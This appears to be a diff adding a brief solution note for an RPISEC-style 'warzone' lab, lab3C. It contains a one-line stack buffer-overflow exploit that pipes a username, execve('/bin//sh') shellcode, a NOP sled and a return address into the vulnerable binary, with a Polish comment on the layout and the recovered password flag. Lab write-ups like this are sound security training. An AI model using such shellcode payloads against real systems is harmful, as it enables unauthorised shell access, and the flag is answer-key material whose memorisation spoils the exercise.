@@ -1,0 +1,6 @@
+lab3C@warzone:/levels/lab03$ (python -c 'print "rpisec\n"+"x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*55+"\x09\x70\xfd\xb7"'; cat;) | ./lab3C
+
+imie_usera+shellcode+nop_slide+EIP
+
+Password:
+th3r3_iz_n0_4dm1ns_0n1y_U!
